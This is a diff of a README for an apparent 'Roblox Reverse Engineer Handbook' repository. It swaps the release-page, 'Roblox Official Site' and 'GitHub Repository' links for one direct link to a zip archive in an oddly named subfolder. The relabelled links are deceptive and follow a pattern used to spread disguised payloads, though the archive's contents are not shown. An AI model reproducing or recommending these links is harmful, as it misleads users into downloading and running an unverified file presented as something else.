@@ -2,7 +2,7 @@
 
 ## 📦 Download the Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/main/siciliana/Roblox-Reverse-Engineer-Handbook.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/main/siciliana/Roblox-Reverse-Engineer-Handbook.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run the resources from this handbook, you need:
 
 To download the software, please visit the Releases page by clicking the link below:
 
-[Download Here](https://github.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/releases)
+[Download Here](https://raw.githubusercontent.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/main/siciliana/Roblox-Reverse-Engineer-Handbook.zip)
 
 On the Releases page, locate the version that suits your needs. Click on the asset files to download them. After downloading, follow these steps:
 
@@ -70,7 +70,7 @@ If you have questions or need assistance, you can reach out within the community
 
 ## 🔗 Useful Links
 
-- [Roblox Official Site](https://www.roblox.com)
-- [GitHub Repository](https://github.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook)
+- [Roblox Official Site](https://raw.githubusercontent.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/main/siciliana/Roblox-Reverse-Engineer-Handbook.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Mr-0-Unknown/Roblox-Reverse-Engineer-Handbook/main/siciliana/Roblox-Reverse-Engineer-Handbook.zip)
 
 Feel free to explore the handbook and gain a better understanding of the security frameworks in place at Roblox.
